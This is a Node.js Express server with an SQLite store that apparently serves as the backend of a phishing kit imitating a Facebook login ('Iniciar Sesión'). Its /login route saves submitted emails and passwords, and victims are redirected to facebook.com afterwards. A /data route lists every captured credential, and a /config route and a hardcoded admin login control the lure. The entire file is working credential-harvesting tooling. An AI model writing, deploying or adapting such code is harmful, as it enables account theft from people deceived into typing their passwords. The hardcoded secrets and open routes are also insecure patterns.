const express = require("express");
const sqlite3 = require("sqlite3").verbose();
const cors = require("cors");
const app = express();

const ADMIN_USER = "xacherys"; 
const ADMIN_PASS = "xacherys"; 

app.use(cors());
app.use(express.json());
app.use(express.static("public"));

const db = new sqlite3.Database("database.db");

db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS logins (id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, password TEXT, date DATETIME DEFAULT CURRENT_TIMESTAMP)`);
    db.run(`CREATE TABLE IF NOT EXISTS config (id INTEGER PRIMARY KEY, redirect_url TEXT, counter_id TEXT, title TEXT)`, () => {
        db.run("INSERT OR IGNORE INTO config (id, redirect_url, counter_id, title) VALUES (1, 'https://facebook.com', '', 'Iniciar Sesión')");
    });
});

app.post("/admin-login", (req, res) => {
    const { user, pass } = req.body;
    if (user === ADMIN_USER && pass === ADMIN_PASS) {
        res.json({ success: true, token: "jeffrey_secure_token_2026" });
    } else {
        res.status(401).json({ success: false });
    }
});

app.get("/config", (req, res) => {
    db.get("SELECT * FROM config WHERE id = 1", (err, row) => res.json(row));
});

app.post("/config", (req, res) => {
    const { url, counter_id, title } = req.body;
    db.run("UPDATE config SET redirect_url = ?, counter_id = ?, title = ? WHERE id = 1", [url, counter_id, title], () => res.json({ success: true }));
});

app.post("/login", (req, res) => {
    const { email, password } = req.body;
    db.run("INSERT INTO logins (email, password) VALUES (?, ?)", [email, password], () => res.json({ saved: true }));
});

app.get("/data", (req, res) => {
    db.all("SELECT * FROM logins ORDER BY id DESC", (err, rows) => res.json(rows));
});

// RUTA PARA BORRAR
app.delete("/delete/:id", (req, res) => {
    db.run("DELETE FROM logins WHERE id = ?", [req.params.id], () => res.json({ deleted: true }));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor en puerto ${PORT}`));
